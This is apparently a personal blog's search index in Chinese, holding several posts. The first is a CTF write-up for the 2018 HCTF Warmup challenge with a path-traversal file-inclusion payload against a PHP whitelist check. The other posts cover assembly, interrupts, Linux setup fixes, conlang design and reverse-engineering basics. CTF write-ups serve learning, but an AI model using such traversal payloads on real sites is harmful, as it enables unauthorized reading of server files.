<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018 HCTF Warmup</title>
    <url>/2018-hctf-warmup/</url>
    <content><![CDATA[<p>打开题目出现滑稽图片</p>
<p>F12看到提示source.php</p>
<p>简单分析source.php后看见hint.php</p>
<p>进入hint.php</p>
<p>提示flag在ffffllllaaaagggg文件当中</p>
<p>分析各个白名单过滤函数</p>
<p>（strpos() 助记:stringPosition）</p>
<p>关键点在于如何get传入含有两个问号的字符串</p>
<p>构造payload</p>
<p><code>?file=source.php?file=/../../../../../../../ffffllllaaaagggg</code></p>
<h2 id="更新">2021.5.22更新</h2>
<p><code>?file=source.php?file=/../../../../../../../ffffllllaaaagggg</code></p>
<p>这个payload原先是直接抄别的WP的</p>
<p>后来误导笔者走向了一个致命的误区</p>
<p>下面直接说结论,跳过笔者搜索过程和做lab过程</p>
<p>当php服务部署在Linux操作系统上的时候，作为一门弱耦合的语言，会有如下现象：</p>
<p>include函数查询目录时，首先会以<code>/</code>符号为分界,当某个目录查找失败时,会将查找对象直接变为下一个<code>/</code>符号后所指定的目录,并尝试进行查找,例如:</p>
<p><code>include (sdfsfgstd/dir1/dir2/dwgegebsdf/flag)</code></p>
<p>其中,只有dir1和dir2是合法目录,而flag是最终flag文件,include会抛出两个warning然后打开/dir1/dir2/flag</p>
<p>具体到本题,payload也可以是:</p>
<p><code>?file=source.php?sdfwegreawfw/../../../../sdvsdfsa/../ffffllllaaaagggg</code></p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>C++简明进阶教程0</title>
    <url>/c-jian-ming-jin-jie-jiao-cheng-0/</url>
    <content><![CDATA[<p>其他内容请查看 https://ksxmyqj.gitbook.io/cpp-concise-advanced-tutorial-why-were-these-code-safe/</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>and esp, 0FFFFFFF0h的作用</title>
    <url>/and-esp-0fffffff0h-de-zuo-yong/</url>
    <content><![CDATA[<p>主要是为了抬地址，对齐</p>
<p>不过更重要的细节是，IDA有时会因此对esp分析错误</p>
<p>基于esp，而非ebp的函数体需要多加注意，最好还是去动调一下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101059.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>Arch Manjaro KDE 无法创建输入输出后端。未知的协议“tg”</title>
    <url>/arch-manjaro-kde-wu-fa-chuang-jian-shu-ru-shu-chu-hou-duan-wei-zhi-de-xie-yi-tg/</url>
    <content><![CDATA[<p>无法打开telegram链接</p>
<p>解决方法：</p>
<p>1.确认你平时登录的用户，如果是root用户，这个帖子对你无效</p>
<p>2.如果平时是用普通用户的话，vim ~/.local/share/applications/   然后进Telegram配置文件</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172056064.png" /></p>
<p>manjaro默认Vim有插件,双击就可以进去，如果你没有插件那就找找自行路径</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101309.png" /></p>
<p>进去后是这样的</p>
<p>在[Desktop Entry]里面任意位置写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MimeType=x-scheme-handler/tg;</span><br></pre></td></tr></table></figure>
<p>即可</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制杂文(1)  中断</title>
    <url>/binary-article-break-points/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<h2 id="正文">正文</h2>
<p><strong>标志寄存器的标志 置0或者置1本身是毫无意义的,他只是CPU用来瞄一眼的</strong></p>
<p>这个观点在大多数情况下无用,一个比较特别的例子如下</p>
<p>进程PID 1和进程 PID 2同时发起中断,由于中断是最高优先级的指令,CPU需要优先处理</p>
<p>PID1和PID2发起中断的方式是<strong>寄存器中断标志位 置1,而非直接告知CPU需要中断</strong>(黑体部分很像是废话,但在本例当中很重要,先记住,我们继续说)</p>
<p>CPU在每个指令周期的第一个工作(除例行初始化外)是查看中断位(view brk R, <strong>VBR</strong>),第二个工作是重设看门狗(reset watchdog)</p>
<p>假设PID1和PID2同时发起的中断刚好在VBR之后,那么该中断请求只有下一周期开始时会被处理</p>
<p>假设现在已经进入了下一周期,则需要进行中断队列判优,大概是这样</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101511.png" /></p>
<p>判优算法笔者不清楚,这里oop一下就好,假设使用的函数是foo()就行,</p>
<p>foo会操作IRQ置1,然后向INVEC告知PID,进行相关中断操作,然后经由INACK发送feedback响应至源</p>
<p>这里可以发现,两点,一个是虽然中断是最高优先级的异常,但各种中断的优先级各自不同,中断的到达的先后顺序与中断在队列中的位置无关,另一个是CPU处理中断与IRQ真值有关,而非进程直接与CPU请求中断,理解第二点很重要,我可以举一个其他例子</p>
<p>比如我们不应该吧jmp 401000理解为让CPU的下一条执行指令变为401000处的指令</p>
<p>而应该理解为 mov EIP,401000(实际上mov并不能修改EIP)</p>
<p>也就是说所有的指令都并非真的是<strong>直接</strong>请求CPU进行某种操作,不过其他指令我们不考虑,主要是中断的外在显露比较强</p>
<p>好,我们回到中断上</p>
<p>IRQ置1还有一个很重要的硬件级功能:<strong>在IRQ接收到信号后,接受此后的第一个invec信号,然后屏蔽所有INVEC信号直到CPU退出中断模式</strong></p>
<p>当判优器一眼瞟过去,看见多个优先级相同的中断是有可能的,按照某种算法给出IRQ与INVEC后,CPU为了避免相同优先级的其他IRQ干扰,会暂时屏蔽INVEC引脚</p>
<p>然后是中断和异常的区别和关系,看了很多资料之后,笔者目前倾向于把这两个东西看做一个东西,本质相同而外在不同的东西非要分成不同子类,太像是文科干的事情了</p>
<p>总的来说这两个东西(还包括trap什么的)的处置函数全都映射在同一张表上(IDT)</p>
<p>另外还需要注意的是,允许多线程同时运行的现代操作系统和现代CPU对中断处理的一个特点是<strong>异步性</strong>,引用一段话来解释这一点:</p>
<blockquote>
<p>Operating Systems: Three Easy Pieces</p>
<p>定时器可以被编程为每隔多少毫秒引发一次中断；当中断被引发时，当前运行的进程被停止，操作系统中预先配置的中断处理程序运行。此时，操作系统其实已经重新获得了对CPU的控制权</p>
</blockquote>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>中断的必要性与有限状态机的关系</title>
    <url>/binary-articles-break-points-and-finite-state-machine/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>见系列第一篇</p>
<h2 id="正文">正文</h2>
<p>为什么需要中断</p>
<p>简单、常见、浅显而切中要害的回答是,因为现代操作系统和CPU支持多线程,而实现多线程的方式是切换上下文,为了保存现场和恢复运行点,我们引入了中断这一功能</p>
<p>更深层的回答是,<strong>没有中断功能的计算机不是有限状态机</strong></p>
<p>形而上学地，一个没有中断的计算机体系是<strong>决定论</strong>的：得知某个时刻CPU和内存的全部数据状态，就可以推衍得出未来和过去的全部过程。这样的计算机无法交互，只是个加速器。</p>
<p>加入中断的计算机体系，正在执行的指令和随时可能需要执行的指令形成了异步关系</p>
<p>外界输入的引入使得计算机程序不再是决定论。</p>
<p>而“由用户实时控制的中断输入”，正是有限状态机的扳机。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>指令集模仿设计笔记 (1) Call(E8)和Call(FF)</title>
    <url>/calle8-he-callff/</url>
    <content><![CDATA[<p>E8为near relative CALL,</p>
<p>FF为absolute CALL</p>
<p>前者Op/En基于D,操作数在机器码层面为signed Offset</p>
<p>后者Op/En基于M</p>
<p>这样就解决了CPU设计过程中两个重要问题:</p>
<p>1.RELATIVE CALL的方向是如何确定的；答，操作数是有符号数</p>
<p>2.如下代码是如何编译的；答， near relative CALL 00 00 00 00</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL @F; </span><br><span class="line">@@:</span><br><span class="line">mov eax,eax;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>二十五小时创造一门自然语言(用于魔幻类游戏)</title>
    <url>/conlang/</url>
    <content><![CDATA[<blockquote>
<p>转自本人奶牛关博客</p>
<p>未经允许,禁止任何转载和二创</p>
</blockquote>
<h2 id="导论"><strong>导论</strong></h2>
<p>人造语言，英文：Constructed Language，中文简称造语，英文简称：Conlang；</p>
<p>相信本文读者当中不乏喜欢魔幻类游戏的玩家，对于上古卷轴系列肯定并不陌生</p>
<p>在上古卷轴系列当中，出现了龙语这一语种</p>
<p>也许很多玩家认为龙语的字符就是鬼画符，仅仅是美工的艺术设计</p>
<p>实际上不然，这些龙语的字符都是有明确含义的</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051711.jpeg" /></p>
<p>龙语字母表</p>
<p>本文不讲述龙语学习</p>
<p>有兴趣的朋友可以在https://www.thuum.org/获得全套龙语学习资料</p>
<p>学习一门造语可以极大地帮助你创造一门造语，但是并不强求（也不必学的多深）</p>
<p>这里我还推荐大名鼎鼎的其他几门造语：塔语、魔兽世界精灵语、魔戒精灵语、星语、克林贡语、多斯拉克语、阿凡达Na’vi语</p>
<p>此外再推荐一个著名的造语论坛：conlang.org</p>
<h2 id="语言学导论"><strong>语言学导论</strong></h2>
<p>先来补补大学的公共选修课，语言学导论</p>
<p>如果你大学学过的话，跳过本部分，或者稍微复习一下就行了</p>
<p>没学过的话，我会尽快简述一下核心思想</p>
<p>遇到不懂的名词请善用百度谷歌，限于篇幅，不会一一解释所有专有名词</p>
<p><strong>同时，本文当中有些概念我会故意讲得很不严谨</strong>，这是为了方便各位理解。概念的不清晰会影响考试，但是不影响我们实操<strong>（不严谨的地方一律会标出）</strong></p>
<p><strong>人类的语音系统由元音、辅音、音调组成</strong>，下面我们来解释一下核心部分</p>
<h3 id="元音">元音</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051475.png" /></p>
<p>IPA元音表</p>
<p>暂时看不懂这个表也没关系，现在只需要有个印象就行，后面会解释。当然，能看懂更好</p>
<p>OK，我们继续往下讲</p>
<p><strong>元音，即气流通过口腔，不受舌、牙、唇的阻碍而发出的音</strong></p>
<p>通俗来说就是：啊，污，衣  等发音（请各位自行念一下，感受气流和舌头、牙齿的关系）</p>
<p>这里要注意一下，不受阻碍和受到调节是不一样的</p>
<p>受到阻碍的例子有：噗  受到了唇的阻碍</p>
<p>但是 污 是受到唇的调节，而非阻碍<strong>（不严谨）</strong></p>
<p>要注意的一点是，有些语言当中的某些读音<strong>完全符合元音定义</strong>，但是在这种语言的语法教学当中可能不被视作元音，而是有其他名字，对于这种情况，这里我们姑且统一称之为元音，即<strong>真元音</strong></p>
<p>介于本文的绝大多数读者对汉语、英语的发音习惯更加熟悉，因此，为了便于后续工程进行，我们的造语可以只选用以下元音（至于这些元音是如何选出的，限于本文篇幅不予展开，请各位读者自行了解IPA，这里我们只需要知道，选择了这些元音即可）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051540.png" /></p>
<p>被选出的元音</p>
<p>当然你也可以挑选其他不同的元音，创造出完全不一样的语言</p>
<h3 id="辅音"><strong>辅音</strong></h3>
<p>对于辅音的定义，我们可以这样理解：<strong>不是元音的音都被称之为辅音</strong></p>
<p>我们来看看IPA辅音表</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051316.png" /></p>
<p>灰色部分意思是解剖学角度人类不可能发出的音</p>
<p>空白部分意思是解剖学角度人类可以发出的音，但是目前世界上没有任何自然语言使用这个发音</p>
<p>（这些发音也可以考虑使用，富有神秘气息）</p>
<p>介于汉语、英语的发音习惯，我们可以只选用以下辅音（便于后续工程进行）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051015.png" /></p>
<p>（至于这些辅音是如何选出的，限于本文篇幅不予展开，本文只是一个引子，真要想创造一门造语的话，还得学很多东西）</p>
<p>现在我们选择出了41个音素</p>
<p>为了便于输入（音标不易输入）我们总结一下，列一个字母表（alphabet）</p>
<p>（暂时先使用拉丁字母，我们之后还要造字）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051388.png" /></p>
<h4 id="小结ⅰ">小结Ⅰ</h4>
<p>到这里，大部分语言学零基础/不扎实的同学要开始懵逼了</p>
<p>如何选择这些元音、辅音呢？</p>
<p>选择标准如何确定呢？</p>
<p>选择不同的音素会给语言风格造成什么影响呢？</p>
<p>我们来一一解读一下</p>
<p>首先我们必须学习/复习一下<strong>元音和谐律</strong></p>
<hr />
<p>本文yuan载 https://valkierja.github.io/ 谨防爬虫</p>
<hr />
<h3 id="元音和谐律">元音和谐律</h3>
<p>什么是元音和谐律？通俗的来讲就是<strong>男女有别</strong></p>
<p>语言学家出于一些我们不必深究的目的（简单来说就是可以让语言听起来更加和谐），将元音分为公的、母的、无性别的（标准说法也就是：阳性、阴性、中性）</p>
<p>在同一个单词当中，要是出现了公的元音，就不能再出现母的元音，但是还可以出现无性别的元音</p>
<p>反之亦然</p>
<p>比如：ulus（民族、国家）（土耳其语）</p>
<p>至于在造语这里</p>
<p>我们可以这样划分：ü[y]、ö[ø]、ä [æ]为阳性元音；u、o[o]、a[a]为阴性元音；i、e[e]、ê[ə]为中性元音。</p>
<p>当然你也可以用其他方式进行划分，只需要让划分出来的阳性元音都有某种共同特点，阴性元音都有另一种特点即可：</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181051447.png" /></p>
<p>看图可能会更直观一些</p>
<p>再次强调一下，<strong>划分方式不是唯一的，只需要让划分出来的阳性元音都有某种共同特点，阴性元音都有另一种特点即可</strong></p>
<p>划分的不同仅仅影响后续构词法的规则，仅仅是一种<strong>人为定义</strong></p>
<p>若不划分，造出来的词汇往往<strong>难以发音，不自然</strong>，简单来说就是<strong>很假</strong></p>
<p>划分之后，造语的发音就会很像是真实存在的自然语言</p>
<h2 id="语言风格"><strong>语言风格</strong></h2>
<p>不知道有多少读者曾经听说过以下观点：</p>
<p><strong>元音丰富的语言更加悦耳</strong></p>
<p>对于这一说法，在学术界中还有一些主观性争议，但可以确定的一点是，在大方向上，是基本正确的，虽然“悦耳”是比较主观的，但就悦耳这点而言，批判标准具有普世性</p>
<p>此外，以下观点与上述观点类似，基本正确，但还有一些主观因素，可以视作历代造语前辈们的结论</p>
<p>（遇到不明白的专有名词，请谷歌，或者是看一些语言学入门级书籍：《语言学入门指南：带你玩转语言密码》陈润 ；《语言学教程》胡壮麟 ； 《统计自然语言处理基础》克里斯托弗·D·曼宁）</p>
<p>富含<strong>圆唇音</strong>和<strong>鼻化元音</strong>会带来<strong>和平、乡土气息</strong>的感觉</p>
<p><strong>复辅音较少</strong>，韵律感更强，更适合用来<strong>写诗、写歌、写短句</strong>（<strong>反之，则会给人带来宗教感，或是适合用来写魔法吟唱）</strong></p>
<p><strong>富含擦音/硬腭化音</strong>的语言，给人一种<strong>军国主义的野心感</strong>，也有可能让人联想到<strong>野蛮、未开化、异邦、奇异</strong></p>
<p><strong>卷舌音</strong>丰富给人一种<strong>部落文明、低等文明</strong>的感觉，也有可能让人联想到<strong>萨满文化</strong></p>
<p><strong>以上论调，反之亦然</strong></p>
<p>这些是笔者总结了几种比较常见的结论（笔者只知道这几种...）</p>
<p><strong>欢迎评论区语言学大佬补充</strong></p>
<p><strong>欢迎评论区语言学大佬补充</strong></p>
<p><strong>欢迎评论区语言学大佬补充</strong></p>
<p>如果您有其他语言风格的需求，不妨在造语的相关论坛多逛逛（文章开头说的那几种造语还有印象吗？）</p>
<h2 id="造词">造词</h2>
<p>很明显地，有的词汇在所有语言当中都会出现</p>
<p>比如“我”、“吃”等等</p>
<p><strong>根据词频造词</strong>可以极大优化地我们的工作</p>
<p>这里我推荐用<strong>斯瓦迪士核心词汇表</strong>辅助我们的工作，你可以在维基百科找到它</p>
<p>在造词之前，我们需要明确几个概念：语言一般而言主要有以下四种形态</p>
<p><strong>孤立语</strong></p>
<p>不通过词的内部变化来表达词的语法作用，而是通过虚词以及语序来显示词的语法作用</p>
<p>例子：中文</p>
<p><strong>黏着语</strong></p>
<p>词内部<strong>拥有形态变化</strong>，语法关系通过词的形态变化来表示。黏着语的词的每个形态只表示一种语法意义，每种语法意义总是用同一个形态来表达。（一对一）</p>
<p>例子：日语</p>
<p><strong>屈折语</strong></p>
<p>词内部拥有形态变化，每个形态可以同时表示几个语法意义，每个语法意义又可以用几个形态来表示。（多对多）</p>
<p>例子：法语、德语</p>
<p><strong>复综语</strong></p>
<p>定义我就不说了，可以简单理解为词与词之间没有空格的英语：用一个特别长的、含有一堆词根的单词直接作为一个句子（一个句子只需要一个单词）</p>
<p>例子：西格陵兰语、上古卷轴龙语</p>
<h3 id="小结ⅱ">小结Ⅱ</h3>
<p>知道以上四大类语言之后，各位就可以考虑考虑，到底要创造什么样的语言了，并朝着这个方向造词（先暂时使用拉丁字母代替音素，之后我们会造字的）</p>
<h3 id="开始动手">开始动手</h3>
<p>各位可能看过类似于以下的说法：</p>
<p><strong>xx造语是以法语为基础演变而来</strong></p>
<p>实际上，许多造语都是这样的操作的，当然你也可以完全白手起家，不以任何语言为基础</p>
<p>我们以英语为例来演示一下</p>
<p>比如，“想”的英文是think，我们可以以此为基础造出dinq这一单词</p>
<p>以某语言为基础演变出造语的要点是：</p>
<p><strong>1.演变方法基本相同</strong>（不能完全相同，不然依旧很假，因为世界上所有语言的构词法都有或多或少的例外）：比如尾音k--&gt;q，那么fuck这个单词最好演变成一个q结尾的单词；同时我们还可以规定，词中k，词首k的演化规律与词尾k完全不同</p>
<p><strong>2.符合前文的元音和谐律</strong></p>
<p><strong>3.变化一定要足够大</strong>，<strong>不能让人看出原单词</strong>：比如think可以转化成dinq，但是转化成thinque就不太合适了</p>
<p><strong>4.你本人必须能标准地发出这些词汇的音，同时这个发音不会让你有任何违和感；或者虽然有违和感，但是这种违和感符合你的需求</strong></p>
<p><strong>5.符合常识</strong>：比如拟声词、紧急情况的警告词等等必须要符合常识，比如：音素的数量不能太多等等</p>
<p><strong>6."灵机一动型"词汇占比20%左右</strong>（防止玩家看出你的造语是基于什么语言，"灵机一动型"词汇算是一种干扰手段）："灵机一动型"词汇就是你不基于任何已有语言词汇而造出来的词汇；比如我灵机一动，想用lum表示“火炮”，那就用呗，毕竟是自己说的算，但是要注意<strong>"灵机一动型"词汇</strong>需要与其他词汇之间没有违和感</p>
<h3 id="进一步地">进一步地</h3>
<p>现在我们有了常用200词，我们可以进一步地进行造词：</p>
<p>比如：游戏当中的常见武器、生物、食物、药物、技能、魔法吟文所需词汇；等等。</p>
<p>然后是派生词：比如“棍”派生出木棍、铁棍、栅栏、篱笆、监狱；等等。</p>
<p>感叹词、抽象词等等</p>
<p>这里就不一一举例了</p>
<p>秉持原则：用啥造啥，多余的不要造，以免出现违和感</p>
<h3 id="词典"><strong>词典</strong></h3>
<p>我建议使用Excel作为词典的记录软件，Excel的使用教程请自行搜索</p>
<p>当然，也可以使用Babylon等专业词典编辑软件</p>
<p>但是，实际上Excel就够用了</p>
<h3 id="创造语法规则">创造语法规则</h3>
<p>现在我们已经有了大多数需要的词汇，于是我们可以开始写剧情了</p>
<p>但是在写剧情之前有一个很重要的问题：把单词连成句子的前提是，有一套基本的语法规则</p>
<h3 id="了解英语的句式结构确定造语的语序">了解英语的句式结构、确定造语的语序</h3>
<p>我们先来看看英语五大句式：</p>
<ol type="1">
<li>主语+谓语</li>
<li>主语+谓语+宾语</li>
<li>主语+谓语+宾语+宾补</li>
<li>主语+系动词+表语</li>
<li>主语+谓语+宾语+间宾</li>
</ol>
<p>这就规定了英语的一个句子必然是主语打头，谓语中间，宾语（如果有的话）在后面</p>
<p>我们再来看看日语：</p>
<p>主语+宾语+谓语</p>
<p>与英语的句子相比，就有很大的不同</p>
<p>我们可以采用这两种在世界范围内比较常见的句式结构之一，也可以使用其他比较骚的句式结构，比如：</p>
<p>谓语+主语+宾语</p>
<p>谓语+宾语+主语</p>
<p>情感词（感叹词）+主语+谓语+宾语（塔语的句式结构）</p>
<p>等等</p>
<h3 id="构筑语法大厦">构筑语法大厦</h3>
<p>首先要对你的造语确定几个方面的语法问题：</p>
<ol type="1">
<li>有没有人称、数、性、格的变化？</li>
<li>如果有任意一项，是通过什么来实现的？你的语言是黏着语还是屈折语？抑或是复综语？</li>
<li>如果都没有，你这个语言在表达这些变化时，如何避免歧义？引入什么语法规则适合你这个语言？（举两个例子：比如汉语当中的“们”这个字，就是用于表达数的变化；英语的you虽然可以表达“你”也可以表达“你们”但是并不会造成歧义，因为99.99%的英语名词都有严格的数的变化，几个特例不会影响语义）</li>
</ol>
<p>这里可以举一个比较完整、凝练的语法结构例子：</p>
<p>•        词汇不区分<strong>语法性别</strong>；</p>
<p>•        名词、代词区别<strong>单数、双数、复数</strong>；</p>
<p>•        格的概念通过格标志和介词等表示；</p>
<p>•        正常语序为<strong>宾语+谓语+主语</strong>；</p>
<p>•        疑问语序为<strong>宾语+谓语+主语+疑问词</strong>；</p>
<p>•        限定成分置于被限定成分的后面；</p>
<p>•        词的变化（派生等等）通过<strong>词缀</strong>实现；</p>
<p>•        从句依赖提示词来提示，提示词后接正常语序的完整句子；</p>
<p>•        阅读方向为<strong>从左到右</strong>，<strong>横向书写</strong>；</p>
<p>•        感叹句不依赖感叹词提示，而是通过将正常语序变更：被感叹部分提前，其余部分保持正常语序；</p>
<p>•        强调句依赖强调词提示，强调词置于句子最开头；</p>
<p>各位把黑体部分置换即可；然后捏造一些语法特例（最好别弄太多）（可以演变自其他语言的语法特例），再规定一下文体（书信、法律文书；等等）的格式，语法这部分就没有框架性问题了</p>
<h3 id="计数系统">计数系统</h3>
<p>计数系统可以讲很多，这里略微提一下，各位谷歌参考一下阿拉伯数字的发展史，然后把一些关键性东西修改一下就行了</p>
<p>比如：阿拉伯数字最右侧一位是个位，我们可以最左侧是个位</p>
<p>再比如西方每三位数字打一个逗号，中国每四位数字空一格空格，我们可以每两位数字/五位数字加以标记；等等</p>
<p>至于十进制和其他进制，也可修改</p>
<h3 id="造字">造字</h3>
<p>我们来解决一下之前的问题：字母表只是使用了41个拉丁字母代替，而没有造出新的字母</p>
<p>软件准备</p>
<p><a href="https://www.fontlab.com/">https://www.fontlab.com/</a></p>
<p>这款字体开发软件在网络上有很多教程，这里不再赘述</p>
<p>可以借鉴一下龙语、世界语等其他多种造语，设计出自己文字书写风格</p>
<p>这部分教程不太好写</p>
<p>主要是自己的想象力</p>
<h3 id="结语">结语</h3>
<p>本文初载于https://valkierja.github.io/未经授权，禁止转载</p>
<p>预祝各位游戏开发成功！</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>语言学</category>
      </categories>
  </entry>
  <entry>
    <title>分离声明和实现的关键性好处</title>
    <url>/definition-declaration/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>我觉得纠结这个问题的时间点太早或太晚都无法彻底理解这样做的好处，而笔者恰巧在一个不早不晚的时间点接触到了大型项目的开发，意识到了这样的好处</p>
<h2 id="正文">正文</h2>
<p>在进行unity客户端开发时，我注意到了这样的一种现象，如图</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181058120.png" /></p>
<p>start函数被标为绿色</p>
<p>OnMove函数仍为灰色</p>
<p>其实原因便是unity早就声明好了start，<strong>就等着</strong>用户去写实现了</p>
<p>而onMove函数并不是unity自带包的接口，没有事先声明，需要我们去写实现，然后后续才会调用，所以仍为灰色</p>
<p>在巨型体量的项目当中</p>
<p>接口暴露，同时实现交给第三方开发者自定义开发，也是很常见的一种做法</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
  </entry>
  <entry>
    <title>DELL G5 BIOS 无法引导grub 解决办法</title>
    <url>/dell-g5-bios-wu-fa-yin-dao-grub-jie-jue-ban-fa/</url>
    <content><![CDATA[<p>气死了，折腾半天</p>
<p>其实最终结果很简单，我简化一下外网搜到的解决方案</p>
<p>简单来说就是，GRUB安装过程中的一项操作是定位GRUB的安装位置，然后告诉BIOS这是一项启动引导项，而不是普通的文件</p>
<p>这步操作由于14版固件更新后出现了bug，而且最多只允许回退到15版固件驱动</p>
<p>解决办法是</p>
<p>第一步，跟着网上的教程正常安装你的双系统Linux，可以把系统安装在任何盘（Windows系统盘或者机械数据盘）</p>
<p>第二步，安装完成后重启电脑，进去一次Windows，然后关机进BIOS</p>
<p>第三步，BIOS那边有一个添加启动项的东西，打开来之后，可能会有点懵逼，别怕，首先把name一行写上GRUB（这个名称无所谓，些啥都可以）</p>
<p>name下面有好几项奇奇怪怪的东西，那些都不用管放着就行，直接看下面的PATH路径栏</p>
<p>在PATH栏的右边有三个点，打开来</p>
<p>这时候就会进入磁盘的底层路径（磁盘不仅仅包括那些C,D,E,F盘当中的文件，还包括不会列出盘符的内容），这时候你只需要一个个找</p>
<p>在这个页面的上面有个下拉选项，是用来选择磁盘区域的，如果看见了一些个人文件，就不要在那个磁盘区域找了，如果看见了很多底层文件就四处找找文件夹内容（根据Linux发行版名称），找到一个叫做grub的文件就行了</p>
<p>双击这个文件就可以添加了</p>
<p>然后再重启就可以用这个启动项了</p>
<p>添加错了也不影响Windows的！要敢做！</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Farm(英语)词源简单考据</title>
    <url>/farm-ying-yu-ci-yuan-jian-dan-kao-ju/</url>
    <content><![CDATA[<h1 id="背景">背景</h1>
<p>之前在玩外服的仙境传说中,第一次遇到Farm这个词，并非用于表达"农场"这个意思,当时完全没看懂对方说的什么,一直很在意</p>
<p>正好，刚刚查资料的时候看见文档里又出现了farm</p>
<p>本着语言学的研究精神,稍微考据了一下farm一词的词源,记录如下</p>
<h1 id="正文">正文</h1>
<blockquote>
<p>Middle English: from Old French <em>ferme</em>, from medieval Latin <em>firma</em> ‘fixed payment’, from Latin <em>firmare</em> ‘fix, settle’ (in medieval Latin ‘contract for’), from <em>firmus</em> ‘constant, firm’; compare with firm2. The noun originally denoted a fixed annual amount payable as rent or tax; this is reflected in farm (sense 3 of the verb), which later gave rise to ‘to subcontract’ (farm (sense 2 of the verb)). The noun came to denote a lease, and, in the early 16th century, land leased for farming. The verb sense ‘grow crops or keep livestock’ dates from the early 19th century.</p>
</blockquote>
<p>懒得不翻译了</p>
<p>总结一下：在计算机领域，Farm一词表示的含义有：</p>
<p>1.同cluster，表示集群的意思，比如docker farm</p>
<p>2.同constant，表示恒定，常数的意思</p>
<p>3.同constract，表示抽象（层），虚拟（层），或者表示构建一个抽象层的意思</p>
<p>4.同analysis，表示（数据）分析</p>
<p>而当年玩游戏时，对方的想表达的意思应该是<strong>刷怪点</strong></p>
<p>farm用作集群的含义</p>
<p><a href="https://imgtu.com/i/owTkJ1"><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181106185.png" alt="owTkJ1.png" /></a></p>
<p>这里的farm也是集群的含义</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>杂谈</category>
        <category>存档</category>
        <category>语言学</category>
      </categories>
  </entry>
  <entry>
    <title>如何从_start函数跟到main函数</title>
    <url>/from-start-to-main/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>刚刚手把手带女朋友从start函数调试到main，然后突然发现自己没有写过这方面的教程，正好写一下</p>
<p>PS：在main函数之前的函数可以具体细分为多种类型的函数，本文一律统称为_start函数</p>
<h2 id="正文">正文</h2>
<p>首先要明确start函数当中都包含什么内容，然后我们才能意识到当前函数体到底是start还是main</p>
<p>根据笔者的经验，对于start函数的内容，我们可以首先思考一下，直接使用汇编写成的程序（只含有程序主逻辑） ，可以运行吗？当然可以；比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,3</span><br><span class="line">mov ebx,4</span><br><span class="line">add eax,ebx  ;a=a+b</span><br><span class="line">ret ;然后返回a</span><br></pre></td></tr></table></figure>
<p>那么我们再思考一下，既然主程序可以运行，那么_start函数的作用是什么</p>
<p>根据笔者自身理解，他们的作用是为程序主逻辑创造一个更好的氛围</p>
<p>比如：了解当前平台和环境情况，以便在可能的情况下运行优化版的函数逻辑，或者是弹出报错“不支持当前平台”，然后退出程序</p>
<p>又或者是拉起一个GUI窗口以便后续资源（比如按钮类，菜单栏类）的加载</p>
<p>亦或者是经由操作系统内核向MMU通信，告知其“有一个新的程序需要申请堆栈”</p>
<p>如果是debug版程序，还可能会导入导出与调试相关的文件信息</p>
<p>诸如此类：1.获取当前运行环境的信息（比如运行平台等） 2.了解程序需要哪些资源（比如GUI环境等），并向操作系统申请、加载 3.获取当前程序可能不需要，但有许多程序需要的信息（比如系统时间等），以便不时之需 4.导入导出调试相关信息，或者是一些检测、处理exception的函数</p>
<p>主要是以上四大类</p>
<p>其次我们还需要明确main函数里面有什么</p>
<p>或者说是，CTF逆向题当中的main函数有什么</p>
<p>大概率来讲，会有一个输入提示“welcome to XXX CTF”或者是“please input your flag”等，然后是gets或者cin等函数的调用，然后是一个加密函数（大概率包含xor等位运算），最后是一个cmp，然后结束</p>
<p>所以一旦看到目标字符串（“welcome to XXX CTF”或者是“please input your flag”等）被调用（Xref）就基本可以判断当前call就是main call</p>
<h3 id="例子">例子</h3>
<p>下载链接：</p>
<p>（2023年3月18日更新：链接已丢失）</p>
